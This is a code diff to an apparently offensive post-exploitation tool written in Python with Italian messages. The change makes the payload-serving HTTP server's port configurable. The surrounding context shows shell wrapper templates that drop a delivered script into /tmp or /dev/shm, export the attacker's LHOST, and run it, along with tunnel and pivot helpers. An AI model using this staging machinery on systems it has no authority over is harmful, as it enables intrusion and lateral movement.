@@ -48,6 +48,7 @@ _server: socketserver.TCPServer | None = None
 _thread: threading.Thread | None = None
 _lhost: str = ""
 _lport: int = 2727
+_srv_port: int = 2727
 
 _log_entries: list[dict[str, str]] = []
 _log_lock = threading.Lock()
@@ -73,6 +74,17 @@ def set_lport(port: int) -> str:
         return f"Porta non valida: {port} (1-65535)"
     _lport = port
     return f"LPORT aggiornato a {_lport}"
+
+
+def set_port(port: int) -> str:
+    global _srv_port
+    if not (1 <= port <= 65535):
+        return f"Porta non valida: {port} (1-65535)"
+    _srv_port = port
+    if _server is not None:
+        stop()
+        return start(port=_srv_port, lhost=_lhost)
+    return f"Porta server aggiornata a {_srv_port} (effettiva al prossimo avvio)"
 
 
 def get_default_ip() -> str:
@@ -3871,7 +3883,7 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             if parts:
                 args_line = " ".join(parts)
 
-        srv_port = _server.server_address[1] if _server else 2727
+        srv_port = _server.server_address[1] if _server else _srv_port
 
         if args_line:
             wrapper = f'#!/bin/sh\n_LINSEAL_SELF=$(mktemp /tmp/linseal.XXXXXX 2>/dev/null || mktemp /dev/shm/linseal.XXXXXX)\ntrap "rm -f \\"$_LINSEAL_SELF\\"" EXIT\ncat > "$_LINSEAL_SELF" <<\'__LINSEAL_EOF__\'\n{script}\n__LINSEAL_EOF__\nchmod +x "$_LINSEAL_SELF"\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n"$_LINSEAL_SELF" {args_line}\n'
@@ -3904,7 +3916,7 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             if parts:
                 args_line = " ".join(parts)
 
-        srv_port = _server.server_address[1] if _server else 2727
+        srv_port = _server.server_address[1] if _server else _srv_port
 
         if args_line:
             wrapper = f'#!/bin/sh\n_SLRECON_SELF=$(mktemp /tmp/slrecon.XXXXXX 2>/dev/null || mktemp /dev/shm/slrecon.XXXXXX)\ntrap "rm -f \\"$_SLRECON_SELF\\"" EXIT\ncat > "$_SLRECON_SELF" <<\'__SLRECON_EOF__\'\n{script}\n__SLRECON_EOF__\nchmod +x "$_SLRECON_SELF"\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n"$_SLRECON_SELF" {args_line} "$@"\n'
@@ -3942,11 +3954,15 @@ class _QuietTCPServer(socketserver.TCPServer):
         pass
 
 
-def start(port: int = 2727, lhost: str | None = None, lport: int | None = None) -> str:
-    global _server, _thread, _lhost, _lport
+def start(port: int | None = None, lhost: str | None = None, lport: int | None = None) -> str:
+    global _server, _thread, _lhost, _lport, _srv_port
 
     if _server is not None:
         return f"Server già attivo su porta {_server.server_address[1]}."
+
+    if port is None:
+        port = _srv_port
+    _srv_port = port
 
     _lhost = lhost or get_default_ip()
     if lport is not None:
@@ -4287,7 +4303,7 @@ def tunnel_start(remote_port: int, local_port: int = 9000,
     tunnel_info = {"remote": remote_port, "local": local_port, "lhost": lhost}
     _tunnels.append(tunnel_info)
 
-    serve_port = _server.server_address[1] if _server else 2727
+    serve_port = _server.server_address[1] if _server else _srv_port
     base = f"http://{lhost}:{serve_port}"
 
     lines = [
@@ -4522,7 +4538,7 @@ def pivot_start(port: int = _LIGOLO_DEFAULT_PORT,
     except Exception as e:
         return f"[-] Errore avvio ligolo-proxy: {e}"
 
-    serve_port = _server.server_address[1] if _server else 2727
+    serve_port = _server.server_address[1] if _server else _srv_port
     base = f"http://{lhost}:{serve_port}"
 
     lines = [
